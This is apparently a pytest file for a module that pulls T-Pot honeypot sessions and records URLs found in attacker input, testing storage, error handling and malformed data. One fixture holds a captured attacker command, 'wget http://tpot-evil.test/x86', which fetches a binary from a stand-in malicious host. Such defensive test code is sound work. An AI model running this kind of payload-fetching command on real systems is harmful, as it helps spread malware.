from tests.api_mocks import load_json


def test_sessions_are_stored(tpot2evaluator_mod, http_mock, config, db):
    call = http_mock.post(config.tpot_url, json=load_json("tpot", "sessions.json"))

    tpot2evaluator_mod.tpot2evaluator()

    assert call.calls[0].request.headers["x-api-key"] == "test-tpot-key"
    assert db.execute("SELECT url, first_seen FROM urls").fetchall() == [("http://tpot-evil.test/x86", "2026-01-01")]
    assert db.execute("SELECT source, honeynet FROM observations").fetchone() == ("GEANT T-Pot", "GEANT T-Pot")
    assert db.execute("SELECT COUNT(*) FROM sessions").fetchone()[0] == 1  # session without URLs is not stored


def test_http_error_stores_nothing(tpot2evaluator_mod, http_mock, config, db):
    http_mock.post(config.tpot_url, status=401)

    tpot2evaluator_mod.tpot2evaluator()

    assert db.execute("SELECT COUNT(*) FROM urls").fetchone()[0] == 0


def test_invalid_response_stores_nothing(tpot2evaluator_mod, http_mock, config, db):
    http_mock.post(config.tpot_url, body="<html>maintenance</html>")

    tpot2evaluator_mod.tpot2evaluator()  # logged, never raises out of the scheduler job

    assert db.execute("SELECT COUNT(*) FROM urls").fetchone()[0] == 0


def test_malformed_session_does_not_stop_the_others(tpot2evaluator_mod, http_mock, config, db):
    http_mock.post(config.tpot_url, json=[
        {"timestamp": "2026-01-01T09:00:00Z"},  # no input
        {"timestamp": "2026-01-01T10:00:00Z", "input": "wget http://tpot-evil.test/x86"}])

    tpot2evaluator_mod.tpot2evaluator()

    assert db.execute("SELECT url FROM urls").fetchall() == [("http://tpot-evil.test/x86",)]
